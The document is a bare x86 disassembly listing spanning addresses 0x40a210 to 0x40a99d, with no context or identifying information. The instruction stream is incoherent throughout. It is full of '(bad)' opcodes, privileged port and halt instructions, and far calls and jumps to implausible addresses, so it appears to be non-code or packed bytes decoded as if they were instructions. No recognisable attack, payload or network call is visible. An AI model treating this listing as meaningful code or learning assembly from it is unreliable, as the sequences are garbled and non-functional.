  40a210:	or     DWORD PTR [ebp+0x279eaf60],ebx
  40a216:	cmp    eax,edi
  40a218:	in     al,dx
  40a219:	shl    DWORD PTR [ecx-0x762cc12],1
  40a21f:	pop    edi
  40a220:	mov    dh,0x13
  40a222:	fsub   QWORD PTR [ecx]
  40a224:	shl    ebp,1
  40a226:	dec    ebp
  40a227:	push   edx
  40a228:	mov    ds:0x2718ce34,al
  40a22d:	or     DWORD PTR [ecx+ecx*4+0x6b],edx
  40a231:	stos   BYTE PTR es:[edi],al
  40a232:	or     eax,0x4b3a0143
  40a237:	into   
  40a238:	sub    DWORD PTR [eax+esi*2-0x5b20157e],0x68
  40a240:	retf   
  40a241:	pusha  
  40a242:	sub    al,0x6
  40a244:	sub    ah,BYTE PTR [ecx+ecx*4-0x79ac7cc4]
  40a24b:	stos   BYTE PTR es:[edi],al
  40a24c:	cmp    ecx,DWORD PTR [eax+0x6f6536b9]
  40a252:	cwde   
  40a253:	jle    0x40a276
  40a255:	sar    BYTE PTR [esi+ecx*1+0x79ade979],0x55
  40a25d:	out    0x26,al
  40a25f:	add    eax,0x387237c7
  40a264:	and    al,0x88
  40a266:	push   eax
  40a267:	loope  0x40a2dc
  40a269:	push   eax
  40a26a:	into   
  40a26b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a26c:	xchg   edi,eax
  40a26d:	jno    0x40a220
  40a26f:	cmp    dh,cl
  40a271:	mov    bh,BYTE PTR [esi]
  40a273:	sar    BYTE PTR [esi],cl
  40a275:	mov    esi,0xfbd6fa4f
  40a27a:	mov    dh,0x5c
  40a27c:	aas    
  40a27d:	ror    ebp,cl
  40a27f:	jp     0x40a2ca
  40a281:	fadd   QWORD PTR [eax+0x90dfe37]
  40a287:	retf   0x23ea
  40a28a:	mov    fs:0xff83434e,eax
  40a290:	adc    ch,BYTE PTR [ecx]
  40a292:	mov    esp,0xdd74bdb1
  40a297:	add    al,0x21
  40a299:	push   ebx
  40a29a:	cmp    ebx,DWORD PTR [eax]
  40a29c:	jns    0x40a2ef
  40a29e:	sar    edx,1
  40a2a0:	sub    edi,DWORD PTR [edx+eax*8+0x40]
  40a2a4:	clc    
  40a2a5:	sub    edx,esi
  40a2a7:	call   0x77a90167
  40a2ac:	jae    0x40a311
  40a2ae:	mov    al,BYTE PTR [esi+0x23858aab]
  40a2b4:	jecxz  0x40a2ec
  40a2b6:	mov    ah,0x38
  40a2b8:	mov    ch,0xc6
  40a2ba:	sbb    ecx,ebx
  40a2bc:	cmp    dh,BYTE PTR [ecx+0x6d]
  40a2bf:	cmp    al,0xf
  40a2c1:	cli    
  40a2c2:	ins    BYTE PTR es:[edi],dx
  40a2c3:	jl     0x40a274
  40a2c5:	cmp    al,0x9b
  40a2c7:	fdivr  DWORD PTR [esp+ebp*1-0x4d]
  40a2cb:	mov    dh,0x46
  40a2cd:	ins    DWORD PTR es:[edi],dx
  40a2ce:	xchg   esp,eax
  40a2cf:	or     ebx,DWORD PTR [edx-0x27990887]
  40a2d5:	imul   edx,DWORD PTR [eax-0x43],0xd2ca561b
  40a2dc:	imul   ebp,DWORD PTR [ebp-0x761df7be],0xc
  40a2e3:	or     dl,0x6f
  40a2e6:	inc    esi
  40a2e7:	or     ax,0xb2c3
  40a2eb:	icebp  
  40a2ec:	push   cs
  40a2ed:	pop    ebp
  40a2ee:	or     BYTE PTR [edi-0x5c4e7331],0xa
  40a2f5:	push   0xdf1c30ac
  40a2fa:	mov    bh,0xa4
  40a2fc:	(bad)  
  40a2fe:	jl     0x40a30a
  40a300:	inc    ebx
  40a301:	sahf   
  40a302:	push   ecx
  40a303:	in     eax,0x31
  40a305:	cld    
  40a306:	ja     0x40a2e8
  40a308:	mov    ah,0xbe
  40a30a:	les    ebx,FWORD PTR [eax]
  40a30c:	cmp    esp,esi
  40a30e:	push   ds
  40a30f:	iret   
  40a310:	sub    bl,BYTE PTR [esi-0x4a]
  40a313:	fstp   TBYTE PTR [ebx]
  40a315:	pop    edi
  40a316:	loop   0x40a37e
  40a318:	(bad)  
  40a319:	mov    al,dl
  40a31b:	hlt    
  40a31c:	into   
  40a31d:	inc    esp
  40a31e:	sub    eax,0x4c09eb6f
  40a323:	lods   al,BYTE PTR ds:[esi]
  40a324:	dec    ecx
  40a325:	inc    edi
  40a326:	jecxz  0x40a305
  40a328:	mov    ecx,0x5a9b9076
  40a32d:	and    eax,0x5f8e9e89
  40a332:	test   cl,0x98
  40a335:	pop    eax
  40a336:	loope  0x40a2f0
  40a338:	dec    ecx
  40a339:	mov    ebp,DWORD PTR [eax-0x3f]
  40a33c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a33d:	hlt    
  40a33e:	and    al,0x1b
  40a340:	mov    esi,0x9fa712ee
  40a345:	int    0x60
  40a347:	ds daa 
  40a349:	inc    esp
  40a34a:	mov    esi,0x38341ad
  40a34f:	lea    edx,[edi+0x7b0348cd]
  40a355:	sub    bl,0xa4
  40a358:	fiadd  DWORD PTR [ebx+edi*4+0x6f0f9c13]
  40a35f:	adc    ebp,esi
  40a361:	mov    WORD PTR [edx+0xebc0d78],fs
  40a367:	out    dx,eax
  40a368:	fst    DWORD PTR [esi]
  40a36a:	scas   eax,DWORD PTR es:[edi]
  40a36b:	retf   
  40a36c:	sar    DWORD PTR [edi-0x71002eae],1
  40a372:	jbe    0x40a3aa
  40a374:	ficom  DWORD PTR [ebx+eax*1-0x3a]
  40a378:	xor    ecx,eax
  40a37a:	dec    eax
  40a37b:	or     al,0xd3
  40a37d:	sub    dl,bh
  40a37f:	fld    TBYTE PTR [esi+ebx*2+0x7]
  40a383:	fnstsw WORD PTR [ecx-0x57]
  40a386:	fucomip st,st(3)
  40a388:	pop    DWORD PTR gs:[ecx+0x37]
  40a38c:	pop    esp
  40a38d:	jns    0x40a343
  40a38f:	inc    ecx
  40a390:	clc    
  40a391:	ror    DWORD PTR [edi],cl
  40a393:	(bad)  
  40a394:	xlat   BYTE PTR ds:[ebx]
  40a395:	scas   al,BYTE PTR es:[edi]
  40a396:	inc    edx
  40a397:	mov    eax,ds:0xdd22a620
  40a39c:	adc    BYTE PTR [eax],bh
  40a39e:	or     eax,DWORD PTR [ebx-0x69900200]
  40a3a4:	in     al,dx
  40a3a5:	lods   eax,DWORD PTR ds:[esi]
  40a3a6:	xor    ch,ch
  40a3a8:	pop    ecx
  40a3a9:	xchg   ebp,eax
  40a3aa:	or     eax,0x89622487
  40a3af:	mov    bh,0x17
  40a3b1:	clc    
  40a3b2:	fst    QWORD PTR [edx]
  40a3b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a3b5:	push   esp
  40a3b6:	cld    
  40a3b7:	(bad)
  40a3ba:	xchg   ebx,eax
  40a3bb:	push   eax
  40a3bc:	aaa    
  40a3bd:	das    
  40a3be:	test   al,0x92
  40a3c0:	shl    bh,cl
  40a3c2:	mov    ah,0x3d
  40a3c4:	addr16 push ds
  40a3c6:	adc    eax,0x85a0f547
  40a3cb:	test   bh,0x13
  40a3ce:	add    cl,BYTE PTR [eax]
  40a3d0:	adc    ebx,ebx
  40a3d2:	fld    QWORD PTR ss:[ebx-0x77]
  40a3d6:	push   esi
  40a3d7:	nop
  40a3d8:	sbb    eax,0xf300f5ff
  40a3dd:	adc    BYTE PTR [ebx],0xcc
  40a3e0:	adc    al,0x3
  40a3e2:	test   al,0xa3
  40a3e4:	and    BYTE PTR [ebx],0xe6
  40a3e7:	and    BYTE PTR [eax+0x48c70f6f],dl
  40a3ed:	and    eax,0xb303fb65
  40a3f2:	or     ah,BYTE PTR [edx]
  40a3f4:	pushf  
  40a3f5:	mov    al,0x13
  40a3f7:	dec    edi
  40a3f8:	outs   dx,BYTE PTR ds:[esi]
  40a3f9:	push   esp
  40a3fa:	push   0xdabbf3e5
  40a3ff:	or     esi,DWORD PTR [ecx+eiz*8]
  40a402:	xchg   edx,eax
  40a403:	xchg   BYTE PTR [edi+0x74],al
  40a406:	fdivr  DWORD PTR [ebp-0x4e1660f5]
  40a40c:	push   esp
  40a40d:	and    BYTE PTR [esp+esi*1],dh
  40a410:	retf   
  40a411:	cmp    DWORD PTR gs:[edi+0x3dc3807d],ebx
  40a418:	sub    BYTE PTR [ecx+eax*4],cl
  40a41b:	cmp    eax,0x29c1e49
  40a420:	fisubr WORD PTR [edx]
  40a422:	rol    ecx,1
  40a424:	js     0x40a460
  40a426:	(bad)  
  40a427:	stos   BYTE PTR es:[edi],al
  40a428:	sar    DWORD PTR [ebx+0x5a99e786],cl
  40a42e:	jae    0x40a418
  40a430:	call   0x8f70:0xf1c206a
  40a437:	test   al,0x38
  40a439:	movhlps xmm7,xmm3
  40a43c:	sti    
  40a43d:	cmp    ecx,esp
  40a43f:	jmp    0x39e19674
  40a444:	pusha  
  40a445:	mov    ds:0xccd46d5b,al
  40a44a:	pop    esp
  40a44b:	push   DWORD PTR [ebx]
  40a44d:	daa    
  40a44e:	adc    eax,0xfb842c17
  40a453:	sub    ah,cl
  40a455:	test   DWORD PTR [edx],edi
  40a457:	pop    ecx
  40a458:	out    dx,al
  40a459:	mov    bh,0x16
  40a45b:	lahf   
  40a45c:	in     al,dx
  40a45d:	dec    ecx
  40a45e:	mov    edx,DWORD PTR [edx-0x15]
  40a461:	mov    WORD PTR [ecx+0x299e85fd],cs
  40a467:	xchg   bl,cl
  40a469:	xor    dh,BYTE PTR ds:[ebx-0x7a]
  40a46d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a46e:	ret    
  40a46f:	mov    ebx,0xc637eead
  40a474:	and    BYTE PTR [edi-0x23],dl
  40a477:	dec    ecx
  40a478:	cld    
  40a479:	push   es
  40a47a:	and    ebx,esi
  40a47c:	mov    esp,0xda512bdd
  40a481:	push   edx
  40a482:	pop    esp
  40a483:	bswap  eax
  40a485:	in     al,dx
  40a486:	je     0x40a4dd
  40a488:	mov    al,ds:0x57c30058
  40a48d:	call   0xe25e14e3
  40a492:	xchg   edx,eax
  40a493:	fild   WORD PTR [esi-0x5ce58801]
  40a499:	(bad)  
  40a49a:	mov    al,ds:0xc714fe0b
  40a49f:	push   ecx
  40a4a0:	inc    eax
  40a4a1:	fdivr  st(3),st
  40a4a3:	call   0xec6a:0xde1848cc
  40a4aa:	(bad)  
  40a4ac:	sub    ebp,DWORD PTR [edi]
  40a4ae:	aas    
  40a4af:	jbe    0x40a508
  40a4b1:	push   ss
  40a4b2:	cmp    BYTE PTR [ebx+0x7fc7912a],0x6c
  40a4b9:	fisub  WORD PTR ds:0x101fcfde
  40a4bf:	add    BYTE PTR [eax+0x32],dl
  40a4c2:	jae    0x40a4ec
  40a4c4:	xchg   edx,eax
  40a4c5:	sub    dl,ah
  40a4c7:	push   ds
  40a4c8:	mov    al,0x36
  40a4ca:	add    al,0x2a
  40a4cc:	cli    
  40a4cd:	inc    esi
  40a4ce:	adc    DWORD PTR [ecx-0x49c92ec9],eax
  40a4d4:	xor    BYTE PTR [ebx+0xf2a05c6],bh
  40a4da:	add    eax,0x4492653e
  40a4df:	fs test eax,0x6bfc0f7c
  40a4e5:	push   cs
  40a4e6:	(bad)  
  40a4e7:	aam    0xc3
  40a4e9:	imul   edx,DWORD PTR [ecx+ebx*4+0xf5aba87],0xffffffdf
  40a4f1:	or     bl,ah
  40a4f3:	pop    esi
  40a4f4:	ja     0x40a574
  40a4f6:	sbb    bh,BYTE PTR fs:[esi-0x2aea1b86]
  40a4fd:	mov    ebp,0x6e2d5f0c
  40a502:	pop    es
  40a503:	sub    ebx,ebp
  40a505:	inc    eax
  40a506:	mov    ds:0xf70d2e19,eax
  40a50b:	jae    0x40a4ad
  40a50d:	adc    eax,0xb74cc09
  40a512:	mov    dh,BYTE PTR [esi+edx*2+0x1b]
  40a516:	adc    al,0x10
  40a518:	imul   ebx,ebp,0x69f37130
  40a51e:	shl    edi,0xf0
  40a521:	fcomp  QWORD PTR [eax+0x712853e8]
  40a527:	pop    es
  40a528:	cld    
  40a529:	or     BYTE PTR [edi-0x58],cl
  40a52c:	rcr    BYTE PTR [edi+ecx*4],0xf6
  40a530:	jl     0x40a4e0
  40a532:	ins    DWORD PTR es:[edi],dx
  40a533:	jns    0x40a4d0
  40a535:	xor    eax,0xde1a25c1
  40a53a:	dec    ebp
  40a53b:	jns    0x40a577
  40a53d:	scas   eax,DWORD PTR es:[edi]
  40a53e:	sub    BYTE PTR [esi],dl
  40a540:	adc    al,0x54
  40a542:	lods   al,BYTE PTR ds:[esi]
  40a543:	das    
  40a544:	push   eax
  40a545:	ins    BYTE PTR es:[edi],dx
  40a546:	rcl    DWORD PTR [ecx-0x4ea6e881],cl
  40a54c:	call   0x33e2c4c9
  40a551:	sbb    dl,ah
  40a553:	data16 aad 0xfc
  40a556:	jbe    0x40a578
  40a558:	jno    0x40a51e
  40a55a:	sub    edx,DWORD PTR [esp+ecx*1]
  40a55d:	loopne 0x40a520
  40a55f:	rol    BYTE PTR [eax*8-0x1eaa2cc5],1
  40a566:	lods   eax,DWORD PTR ds:[esi]
  40a567:	adc    ebx,DWORD PTR [edx+0x26]
  40a56a:	movups xmm6,xmm4
  40a56d:	mov    esi,0x59d759a4
  40a572:	sub    BYTE PTR [ecx+0x3b],0x1a
  40a576:	outs   dx,DWORD PTR ds:[esi]
  40a577:	dec    ebp
  40a578:	jo     0x40a572
  40a57a:	and    eax,0x7083a5c
  40a57f:	imul   ecx,esp,0xba41be33
  40a585:	mov    ebp,DWORD PTR [ebx-0x32d1db16]
  40a58b:	call   0x20db:0x5f49642c
  40a592:	xor    eax,DWORD PTR [ecx]
  40a594:	data16 outs dx,BYTE PTR ds:[esi]
  40a596:	cwde   
  40a597:	pop    esi
  40a598:	xor    eax,0xfa40ed15
  40a59d:	dec    ecx
  40a59e:	mov    cl,0x78
  40a5a0:	sub    ebp,DWORD PTR [esi+0x64b820ba]
  40a5a6:	mov    fs,WORD PTR [ecx-0x3a]
  40a5a9:	pop    edi
  40a5aa:	jmp    0x1c5b2b25
  40a5af:	cwde   
  40a5b0:	sbb    bh,BYTE PTR [edx]
  40a5b2:	push   eax
  40a5b3:	or     eax,0xdb336b41
  40a5b8:	dec    eax
  40a5b9:	cwde   
  40a5ba:	in     al,0x11
  40a5bc:	mov    ds:0xa0b43e86,al
  40a5c1:	sub    esp,edi
  40a5c3:	sub    al,0xc2
  40a5c5:	sbb    eax,0x6d4984e7
  40a5ca:	or     ebx,ebx
  40a5cc:	push   esi
  40a5cd:	sub    eax,0x1142e966
  40a5d2:	loop   0x40a63a
  40a5d4:	and    al,0xba
  40a5d6:	lahf   
  40a5d7:	mov    dh,0xf9
  40a5d9:	stos   DWORD PTR es:[edi],eax
  40a5da:	int3   
  40a5db:	es jl  0x40a5f0
  40a5de:	fwait
  40a5df:	sar    DWORD PTR [ebx+edi*4],cl
  40a5e2:	cmp    bh,BYTE PTR [edi-0x5969794a]
  40a5e8:	out    dx,eax
  40a5e9:	(bad)  
  40a5ea:	jae    0x40a591
  40a5ec:	out    dx,al
  40a5ed:	pshufw mm5,QWORD PTR [ebp-0xe3713e9],0x10
  40a5f5:	sbb    al,0x9b
  40a5f7:	dec    esp
  40a5f8:	iret   
  40a5f9:	xchg   ebx,eax
  40a5fa:	xchg   ebp,eax
  40a5fb:	pop    esp
  40a5fc:	in     eax,0xca
  40a5fe:	sti    
  40a5ff:	mov    cl,0xf1
  40a601:	out    dx,eax
  40a602:	aam    0xcf
  40a604:	sub    edx,DWORD PTR [ebp+0x68c8fb1]
  40a60a:	fs iret 
  40a60c:	es inc ebp
  40a60e:	outs   dx,DWORD PTR ds:[esi]
  40a60f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a610:	sbb    eax,0xd1f03406
  40a615:	mov    esi,0x4697d802
  40a61a:	jmp    0x1c773d41
  40a61f:	sbb    al,0x46
  40a621:	dec    edi
  40a622:	xchg   ebp,eax
  40a623:	pop    es
  40a624:	(bad)  
  40a625:	pop    eax
  40a626:	js     0x40a67d
  40a628:	test   BYTE PTR [esi+0x470e9e78],0xa0
  40a62f:	xchg   DWORD PTR [ebp+0x4d],esp
  40a632:	xchg   ebp,eax
  40a633:	in     eax,dx
  40a634:	xlat   BYTE PTR ds:[ebx]
  40a635:	scas   al,BYTE PTR es:[edi]
  40a636:	aaa    
  40a637:	jne    0x40a616
  40a639:	je     0x40a69a
  40a63b:	popa   
  40a63c:	aad    0x2c
  40a63e:	loopne 0x40a60c
  40a640:	in     eax,dx
  40a641:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a642:	push   esp
  40a643:	jp     0x40a5d2
  40a645:	in     eax,dx
  40a646:	imul   esp,DWORD PTR [ebx+0x769633e1],0xffffffae
  40a64d:	pop    ss
  40a64e:	xor    eax,0x3d506c82
  40a653:	jecxz  0x40a5fc
  40a655:	cs (bad) 
  40a657:	adc    BYTE PTR [ebx+0x4cc4525d],al
  40a65d:	iret   
  40a65e:	ret    0xd7bc
  40a661:	mov    esp,0x69e3aef
  40a666:	mov    ah,0x3f
  40a668:	ret    
  40a669:	fild   DWORD PTR [edx]
  40a66b:	je     0x40a6cb
  40a66d:	lock (bad) 
  40a670:	aaa    
  40a671:	push   eax
  40a672:	or     al,0xa0
  40a674:	inc    esp
  40a675:	mov    cl,0x85
  40a677:	fistp  WORD PTR [edi+0x35]
  40a67a:	dec    ebx
  40a67b:	mov    ebx,0x76fd072d
  40a680:	cdq    
  40a681:	xlat   BYTE PTR ds:[ebx]
  40a682:	scas   eax,DWORD PTR es:[edi]
  40a683:	and    eax,0x9e3d5139
  40a688:	inc    ebx
  40a689:	pop    ss
  40a68a:	xor    BYTE PTR [ebx+0x42cd83c9],cl
  40a690:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a691:	and    BYTE PTR [edx-0x6003359e],bh
  40a697:	or     ebx,eax
  40a699:	retf   
  40a69a:	xchg   ebp,eax
  40a69b:	xchg   edx,eax
  40a69c:	mov    eax,0xaf4779c5
  40a6a1:	mov    edx,0x9a0ced85
  40a6a6:	popf   
  40a6a7:	xor    cl,BYTE PTR [esi+0x7a]
  40a6aa:	adc    dh,cl
  40a6ac:	jo     0x40a6d9
  40a6ae:	outs   dx,DWORD PTR ds:[esi]
  40a6af:	jmp    DWORD PTR [ecx]
  40a6b1:	stos   BYTE PTR es:[edi],al
  40a6b2:	inc    ebp
  40a6b3:	fmul   DWORD PTR [ebp+0x3e]
  40a6b6:	mov    bh,0x32
  40a6b8:	call   0x43ce:0xd86393e4
  40a6bf:	lea    ecx,[eax]
  40a6c1:	xlat   BYTE PTR ds:[ebx]
  40a6c2:	lea    edi,[edi+0x5]
  40a6c5:	sub    BYTE PTR [eax+0x21],0x71
  40a6c9:	pop    ebp
  40a6ca:	icebp  
  40a6cb:	sbb    BYTE PTR [ebx],0xcc
  40a6ce:	push   es
  40a6cf:	sub    eax,DWORD PTR [edi+0x2dadd39c]
  40a6d5:	call   0xce3b:0x7af09acf
  40a6dc:	shr    BYTE PTR [edi],1
  40a6de:	adc    eax,0x2375a68e
  40a6e3:	mov    esi,0x97320539
  40a6e8:	xor    al,0x23
  40a6ea:	sub    dl,bh
  40a6ec:	adc    eax,0x42cd59ec
  40a6f2:	lock lea eax,[edx+0x136cee3f]
  40a6f9:	ret    0xc6cf
  40a6fc:	stos   DWORD PTR es:[edi],eax
  40a6fd:	fwait
  40a6fe:	pop    ecx
  40a6ff:	push   eax
  40a700:	loopne 0x40a748
  40a702:	sbb    BYTE PTR [ebx-0x441489e2],dh
  40a708:	adc    eax,0xa7ee3463
  40a70d:	es (bad) 
  40a70f:	ficomp DWORD PTR [edx-0x644aaf6c]
  40a715:	out    0x9c,eax
  40a717:	cmp    BYTE PTR [edi],dl
  40a719:	call   0xb2f050ad
  40a71e:	push   esi
  40a71f:	pop    edx
  40a720:	mov    cl,0x40
  40a722:	xchg   ebx,eax
  40a723:	retf   0xe164
  40a726:	mov    al,ds:0x24ad4ba7
  40a72b:	mov    dl,0xfd
  40a72d:	out    dx,eax
  40a72e:	retf   
  40a72f:	fbstp  TBYTE PTR [eax-0x40]
  40a732:	and    DWORD PTR [esi+edi*2+0x7692ef3e],edi
  40a739:	les    ecx,FWORD PTR [eax-0x23]
  40a73c:	inc    ebx
  40a73d:	ret    0xca6b
  40a740:	popw   ss
  40a742:	ja     0x40a703
  40a744:	cdq    
  40a745:	pop    ebp
  40a746:	pop    eax
  40a747:	add    DWORD PTR [edx-0xdc5510f],eax
  40a74d:	jnp    0x40a714
  40a74f:	dec    ecx
  40a750:	fidiv  DWORD PTR [eax]
  40a752:	xchg   esi,eax
  40a753:	jge    0x40a7c4
  40a755:	xchg   edi,eax
  40a756:	das    
  40a757:	add    DWORD PTR [ebx],0x7b
  40a75a:	mov    ebx,0x7c181a06
  40a75f:	inc    ebp
  40a760:	stc    
  40a761:	mov    eax,ds:0x50cdc27e
  40a766:	outs   dx,DWORD PTR ds:[esi]
  40a767:	pop    es
  40a768:	pop    esi
  40a769:	xchg   esp,eax
  40a76a:	cmp    dh,BYTE PTR [edi+esi*8-0x3e]
  40a76e:	retf   0x9f93
  40a771:	mov    bl,0xcc
  40a773:	dec    ebp
  40a774:	inc    edx
  40a775:	retf   
  40a776:	or     eax,0x5e08b9e4
  40a77b:	outs   dx,BYTE PTR ds:[esi]
  40a77c:	in     al,dx
  40a77d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a77e:	push   edi
  40a77f:	mov    edi,?
  40a781:	scas   eax,DWORD PTR es:[edi]
  40a782:	adc    eax,0xa2ac7ca
  40a787:	data16 in al,0x6b
  40a78a:	xor    DWORD PTR [ebx],0x7b005c9f
  40a790:	fld    TBYTE PTR [edi-0x2]
  40a793:	mov    esp,0xa48c4351
  40a798:	inc    ecx
  40a799:	lods   eax,DWORD PTR ds:[esi]
  40a79a:	dec    esp
  40a79b:	(bad)  
  40a79c:	std    
  40a79d:	pop    edx
  40a79e:	jmp    0x40a7fb
  40a7a0:	xchg   edx,eax
  40a7a1:	cs xor ebp,0x16
  40a7a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a7a6:	jmp    0x40a779
  40a7a8:	dec    ecx
  40a7a9:	adc    edi,esi
  40a7ab:	or     ch,BYTE PTR [ebx-0x2b]
  40a7ae:	loopne 0x40a812
  40a7b0:	cmp    esp,DWORD PTR [ebx+ebp*2+0x685333b1]
  40a7b7:	fld    st(3)
  40a7b9:	mov    bh,0xa7
  40a7bb:	mov    dl,0xdf
  40a7bd:	mov    esi,0x2632889d
  40a7c2:	jns    0x40a798
  40a7c4:	pop    ss
  40a7c5:	pop    ds
  40a7c6:	sub    ebx,DWORD PTR [ebx+esi*4+0x4d]
  40a7ca:	mov    edx,0x7ea9a6d
  40a7cf:	ret    
  40a7d0:	inc    eax
  40a7d1:	jno    0x40a82a
  40a7d3:	dec    eax
  40a7d4:	and    eax,0x15901493
  40a7d9:	inc    edx
  40a7da:	retf   0x4a86
  40a7dd:	cmp    BYTE PTR [eax-0x7e],ah
  40a7e0:	add    BYTE PTR [edx],0x16
  40a7e3:	loop   0x40a840
  40a7e5:	ret    0x720d
  40a7e8:	jmp    0x786a27e1
  40a7ed:	pop    ebx
  40a7ee:	(bad)  
  40a7f0:	pop    ebp
  40a7f1:	call   0x85a7:0x837a7d67
  40a7f8:	inc    edi
  40a7f9:	add    cl,BYTE PTR [edx]
  40a7fb:	scas   al,BYTE PTR es:[edi]
  40a7fc:	daa    
  40a7fd:	mov    ds:0x928f29c2,al
  40a802:	jns    0x40a7e6
  40a804:	aaa    
  40a805:	popf   
  40a806:	mov    ch,al
  40a808:	inc    edi
  40a809:	sbb    al,0x2d
  40a80b:	lock inc esi
  40a80d:	ss mov dh,0x4d
  40a810:	dec    ebp
  40a811:	or     DWORD PTR [ebp+0x5fefb9d3],0xffffff8a
  40a818:	push   cs
  40a819:	not    DWORD PTR [ebp-0xda8af09]
  40a81f:	xchg   ebp,eax
  40a820:	cmp    BYTE PTR [ebp-0x1d],0x41
  40a824:	sbb    ecx,ebp
  40a826:	jle    0x40a7ef
  40a828:	or     eax,ecx
  40a82a:	dec    ebp
  40a82b:	dec    eax
  40a82c:	ds js  0x40a880
  40a82f:	daa    
  40a830:	mov    ebx,0x98bdd105
  40a835:	push   ebx
  40a836:	adc    DWORD PTR [edi-0x69b0d593],0x66
  40a83d:	jmp    0x3e96e125
  40a842:	mov    ecx,0x15a8ac49
  40a847:	mov    esp,0xf40b47dd
  40a84c:	adc    WORD PTR [bp+0x71],0xffd4
  40a852:	out    0x3e,al
  40a854:	sub    al,0x91
  40a856:	add    BYTE PTR [ebx-0x2f],dl
  40a859:	in     eax,dx
  40a85a:	sahf   
  40a85b:	pop    edx
  40a85c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a85d:	xchg   edi,eax
  40a85e:	and    ebx,eax
  40a860:	mov    ds:0xf7881f4c,al
  40a865:	push   edi
  40a866:	hlt    
  40a867:	adc    eax,esi
  40a869:	adc    al,0x70
  40a86b:	test   ch,dl
  40a86d:	lods   eax,DWORD PTR ds:[esi]
  40a86e:	push   0x2cbe9e57
  40a873:	dec    ebp
  40a874:	inc    edi
  40a875:	aas    
  40a876:	inc    edi
  40a877:	iret   
  40a878:	aas    
  40a879:	ror    BYTE PTR [edx-0xf],cl
  40a87c:	cwde   
  40a87d:	scas   al,BYTE PTR es:[edi]
  40a87e:	scas   eax,DWORD PTR es:[edi]
  40a87f:	mov    eax,0xf55cad1e
  40a884:	fwait
  40a885:	stos   BYTE PTR es:[edi],al
  40a886:	push   edx
  40a887:	and    DWORD PTR [esi+ebp*2],eax
  40a88a:	cmp    eax,DWORD PTR [ebx+edi*8-0x2f]
  40a88e:	ja     0x40a8b0
  40a890:	push   edi
  40a891:	js     0x40a858
  40a893:	fbstp  TBYTE PTR [eax]
  40a895:	call   0xe905e24
  40a89a:	mov    ds:0xff3df78,eax
  40a89f:	bnd ja 0x40a893
  40a8a2:	ja     0x40a911
  40a8a4:	mov    al,0xf6
  40a8a6:	adc    al,0x3d
  40a8a8:	nop
  40a8a9:	mov    bh,0x2e
  40a8ab:	shl    dh,cl
  40a8ad:	or     DWORD PTR [edi+0x21],0x999659bd
  40a8b4:	mov    cl,bh
  40a8b6:	sub    eax,0x357bfba2
  40a8bb:	or     bl,BYTE PTR [ecx+0x25544c5]
  40a8c1:	in     eax,dx
  40a8c2:	or     esp,esp
  40a8c4:	adc    eax,0x343e59fd
  40a8c9:	repz sar BYTE PTR [ebx+eax*2],cl
  40a8cd:	arpl   WORD PTR [esi+0x4792945],dx
  40a8d3:	pop    ebx
  40a8d4:	inc    ecx
  40a8d5:	sub    BYTE PTR [edi],cl
  40a8d7:	shl    BYTE PTR [esp+eiz*2],cl
  40a8da:	or     al,BYTE PTR [edx+eiz*2]
  40a8dd:	and    al,0x82
  40a8df:	dec    edx
  40a8e0:	jecxz  0x40a89d
  40a8e2:	in     al,dx
  40a8e3:	loopne 0x40a921
  40a8e5:	cmp    ebp,0x84ef1869
  40a8eb:	add    al,0xc4
  40a8ed:	cld    
  40a8ee:	adc    DWORD PTR ds:0x430f7990,ebp
  40a8f4:	xchg   edx,eax
  40a8f5:	jns    0x40a883
  40a8f7:	ins    DWORD PTR es:[edi],dx
  40a8f8:	outs   dx,DWORD PTR ds:[esi]
  40a8f9:	les    ebp,FWORD PTR [edx+eiz*8-0x6f3f0d0b]
  40a900:	jg     0x40a8a6
  40a902:	jbe    0x40a8ba
  40a904:	mov    bl,0x5e
  40a906:	mov    edi,DWORD PTR [eax]
  40a908:	fist   DWORD PTR [edx]
  40a90a:	adc    eax,0x1e3120d0
  40a90f:	lock adc DWORD PTR [eax+0x52ab12c6],edi
  40a916:	sbb    ebp,DWORD PTR [edi+0x79]
  40a919:	(bad)  [ecx-0x1aecb3ae]
  40a91f:	invd   
  40a921:	mov    DWORD PTR [ecx-0x63671afb],ebp
  40a927:	inc    edx
  40a928:	and    ebp,DWORD PTR [ecx+0x54]
  40a92b:	aas    
  40a92c:	mov    cl,0xa0
  40a92e:	sub    eax,0x69eb3de5
  40a933:	in     al,dx
  40a934:	cdq    
  40a935:	es sbb eax,0x103eb081
  40a93b:	pusha  
  40a93c:	xor    al,0xbb
  40a93e:	dec    DWORD PTR [eax-0x32]
  40a941:	retf   
  40a942:	aad    0xfe
  40a944:	mov    ebp,0x6bd5040f
  40a949:	and    bl,dl
  40a94b:	jle    0x40a97e
  40a94d:	(bad)  
  40a94e:	lods   al,BYTE PTR ds:[esi]
  40a94f:	push   ecx
  40a950:	test   al,0x56
  40a952:	push   edx
  40a953:	fcomip st,st(1)
  40a955:	and    ebp,esp
  40a957:	or     BYTE PTR [ebp+0x4a701f3f],cl
  40a95d:	out    0xfb,eax
  40a95f:	or     al,0x7d
  40a961:	adc    DWORD PTR [edx-0x61],eax
  40a964:	push   ds
  40a965:	icebp  
  40a966:	lds    esp,FWORD PTR [ebx-0xac4638a]
  40a96c:	mov    eax,0x12f48a3f
  40a971:	leave  
  40a972:	dec    esp
  40a973:	mov    cs,edx
  40a975:	jg     0x40a978
  40a977:	pop    ss
  40a978:	jae    0x40a92a
  40a97a:	loopne 0x40a902
  40a97c:	push   0x424b9b9b
  40a981:	test   al,0x7b
  40a983:	in     eax,dx
  40a984:	xor    BYTE PTR [esi],cl
  40a986:	add    eax,0xf4020756
  40a98b:	lock adc DWORD PTR [eax+0x50],0x62f0d3a
  40a993:	lahf   
  40a994:	gs dec ebx
  40a996:	int    0xe0
  40a998:	jne    0x40a999
  40a99a:	cwde   
  40a99b:	xchg   esp,eax
  40a99c:	pop    ds
  40a99d:	call   FWORD PTR ds:0xce87eb99
